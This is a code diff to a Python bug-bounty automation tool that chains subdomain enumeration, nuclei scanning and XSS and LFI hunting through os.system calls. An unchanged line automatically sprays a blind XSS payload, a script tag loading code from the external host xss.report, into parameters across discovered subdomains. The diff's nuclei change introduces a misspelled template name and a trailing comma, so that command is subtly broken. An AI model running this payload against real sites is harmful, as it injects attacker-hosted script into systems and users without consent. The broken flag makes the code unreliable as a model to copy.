@@ -149,7 +149,7 @@ class AutomationTool:
             f.write("\n".join(domains_and_subdomains))
 
         os.system(f"subfinder -dL {bbscope_dir}/final_domains_and_subdomains.txt -all -recursive > {bbscope_dir}/large_subdomains.txt")
-        os.system(f"nuclei -l {bbscope_dir}/large_subdomains.txt -t {self.REQUIRED}/nuclei-templates ")
+        os.system(f"nuclei -l {bbscope_dir}/large_subdomains.txt --templates cves,misfocnfiguration, ")
 
     def enum_subdomains(self, target):
         print(Fore.YELLOW + "[+] Enumeration Phase Running..." + Style.RESET_ALL)
@@ -171,7 +171,7 @@ class AutomationTool:
         print(Fore.YELLOW + "[+] XSS finder phase running..." + Style.RESET_ALL)
         os.system(f"subfinder -d {target} | {self.REQUIRED}/go/bin/httpx -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\"><script src=https://xss.report/c/jojo></script>' -parameters")
         os.system(f"paramspider -l {target}-subdomains_alive.txt")
-        os.system(f"cat results/* | sed '/FUZZ//g' > final.txt")
+        os.system(f"cat results/* | sed 's|FUZZ||g' > final.txt")
 
     def lfi_finding(self, target):
         print(Fore.YELLOW + "[+] LFI finder phase running..." + Style.RESET_ALL)
